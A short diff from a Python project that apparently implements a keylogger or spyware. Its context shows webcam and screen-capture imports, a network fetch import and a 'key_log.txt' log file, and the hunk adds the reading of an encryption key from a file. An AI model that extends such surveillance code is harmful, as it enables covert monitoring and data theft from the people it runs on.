@@ -17,6 +17,9 @@ from requests import get
 from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
 from PIL import ImageGrab
 
+with open("Cryptography/encryption_key.txt", "rb") as file:
+    key = file.read()
+
 # Global Variables
 keys_info = "key_log.txt"
 system_info = "syseminfo.txt"
